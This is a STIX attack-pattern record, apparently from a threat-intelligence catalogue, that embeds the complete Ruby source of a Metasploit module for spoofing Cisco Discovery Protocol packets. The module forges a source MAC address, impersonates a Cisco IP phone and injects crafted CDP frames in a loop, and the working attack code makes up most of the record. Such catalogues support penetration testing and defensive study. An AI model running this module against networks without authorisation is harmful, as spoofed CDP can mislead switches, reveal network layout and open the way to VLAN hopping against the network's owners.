{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c41896eb-aad3-4406-8ac6-29fc1963832b",
    "created": "2024-08-14T16:32:54.999021Z",
    "modified": "2024-08-14T16:32:54.999024Z",
    "name": "Send Cisco Discovery Protocol (CDP) Packets",
    "description": " This module sends Cisco Discovery Protocol (CDP) packets. Note that any responses to the CDP packets broadcast from this module will need to be analyzed with an external packet analysis tool, such as tcpdump or Wireshark in order to learn more about the Cisco switch and router environment. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/spoof/cisco/cdp.rb",
            "external_id": "cdp.rb"
        },
        {
            "source_name": "reference",
            "url": "https://en.wikipedia.org/wiki/CDP_Spoofing"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Capture\n\n  def initialize\n\n    super(\n      'Name'        => 'Send Cisco Discovery Protocol (CDP) Packets',\n      'Description' => %q{\n        This module sends Cisco Discovery Protocol (CDP) packets. Note that any responses\n        to the CDP packets broadcast from this module will need to be analyzed with an\n        external packet analysis tool, such as tcpdump or Wireshark in order to learn more\n        about the Cisco switch and router environment.\n      },\n      'Author'      => 'Fatih Ozavci', # viproy.com/fozavci\n      'License'     =>  MSF_LICENSE,\n      'References'  => [\n        [ 'URL', 'https://en.wikipedia.org/wiki/CDP_Spoofing' ]\n      ],\n      'Actions'     => [\n        ['Spoof', { 'Description' => 'Sends CDP packets' }]\n      ],\n      'DefaultAction' => 'Spoof'\n    )\n\n    register_options(\n      [\n        OptString.new('SMAC', [false, \"MAC Address for MAC Spoofing\"]),\n        OptString.new('VTPDOMAIN', [false, \"VTP Domain\"]),\n        OptString.new('DEVICE_ID', [true, \"Device ID (e.g. SIP00070EEA3156)\", \"SEP00070EEA3156\"]),\n        OptString.new('PORT', [true, \"The CDP 'sent through interface' value\", \"Port 1\"]),\n        # XXX: this is not currently implemented\n        #OptString.new('CAPABILITIES',   [false, \"Capabilities of the device (e.g. Router, Host, Switch)\", \"Router\"]),\n        OptString.new('PLATFORM', [true, \"Platform of the device\", \"Cisco IP Phone 7975\"]),\n        OptString.new('SOFTWARE', [true, \"Software of the device\", \"SCCP75.9-3-1SR2-1S\"]),\n        OptBool.new('FULL_DUPLEX', [true, 'True iff full-duplex, false otherwise', true])\n      ])\n\n    deregister_options('FILTER', 'PCAPFILE', 'RHOST', 'SNAPLEN', 'TIMEOUT')\n  end\n\n  def setup\n    check_pcaprub_loaded\n    unless smac\n      fail ArgumentError, \"Unable to get SMAC from #{interface} -- Set INTERFACE or SMAC\"\n    end\n    open_pcap\n    close_pcap\n  end\n\n  def interface\n    @interface ||= datastore['INTERFACE'] || Pcap.lookupdev\n  end\n\n  def smac\n    @smac ||= datastore['SMAC'] || get_mac(interface)\n  end\n\n  def run\n    begin\n      open_pcap\n\n      @run = true\n      cdp_packet = build_cdp\n      print_status(\"Sending CDP messages on #{interface}\")\n      while @run\n        capture.inject(cdp_packet)\n        Rex.sleep(60)\n      end\n    ensure\n      close_pcap\n    end\n  end\n\n  def build_cdp\n    cdp = ''\n    # CDP version\n    cdp << \"\\x02\"\n    # TTL (180s)\n    cdp << \"\\xB4\"\n    # checksum, empty for now\n    cdp << \"\\x00\\x00\"\n    # device ID\n    cdp << tlv(1, datastore['DEVICE_ID'])\n    # port ID\n    cdp << tlv(3, datastore['PORT'])\n    # TODO: implement this correctly\n    # capabilities = datastore['CAPABILITIES'] || \"Host\"\n    # CAPABILITIES\n    # define CDP_CAP_LEVEL1          0x40\n    # define CDP_CAP_FORWARD_IGMP    0x20\n    # define CDP_CAP_NETWORK_LAYER   0x10\n    # define CDP_CAP_LEVEL2_SWITCH   0x08\n    # define CDP_CAP_LEVEL2_SRB      0x04\n    # define CDP_CAP_LEVEL2_TRBR     0x02\n    # define CDP_CAP_LEVEL3_ROUTER   0x01\n    cdp << tlv(4, \"\\x00\\x00\\x00\\x41\")\n    # software version\n    cdp << tlv(5, datastore['SOFTWARE'])\n    # platform\n    cdp << tlv(6, datastore['PLATFORM'])\n    # VTP management domain\n    cdp << tlv(9, datastore['VTPDOMAIN']) if datastore['VTPDOMAIN']\n    # random 1000-7000 power consumption in mW\n    cdp << tlv(0x10, [1000 + rand(6000)].pack('n'))\n    # duplex\n    cdp << tlv(0x0b, datastore['FULL_DUPLEX'] ? \"\\x01\" : \"\\x00\")\n    # VLAn query.  TODO: figure out this field, use tlv, make configurable\n    cdp << \"\\x00\\x0F\\x00\\b \\x02\\x00\\x01\"\n\n    # compute and replace the checksum\n    cdp[2, 2] = [compute_cdp_checksum(cdp)].pack('n')\n\n    # Build and return the final packet, which is 802.3 + LLC + CDP.\n    # 802.3\n    PacketFu::EthHeader.mac2str(\"01:00:0C:CC:CC:CC\") +\n      PacketFu::EthHeader.mac2str(smac) +\n      [cdp.length + 8].pack('n') +\n      # LLC\n      \"\\xAA\\xAA\\x03\\x00\\x00\\x0c\\x20\\x00\" +\n      # CDP\n      cdp\n  end\n\n  def tlv(t, v)\n    [ t, v.length + 4 ].pack(\"nn\") + v\n  end\n\n  def compute_cdp_checksum(cdp)\n    num_shorts = cdp.length / 2\n    checksum = 0\n    remaining = cdp.length\n\n    cdp.unpack(\"S#{num_shorts}\").each do |short|\n      checksum += short\n      remaining -= 2\n    end\n\n    checksum += cdp[cdp.length - 1].getbyte(0) << 8 if remaining == 1\n    checksum = (checksum >> 16) + (checksum & 0xffff)\n    checksum = ~((checksum >> 16) + checksum) & 0xffff\n    ([checksum].pack(\"S*\")).unpack(\"n*\")[0]\n  end\nend\n"
}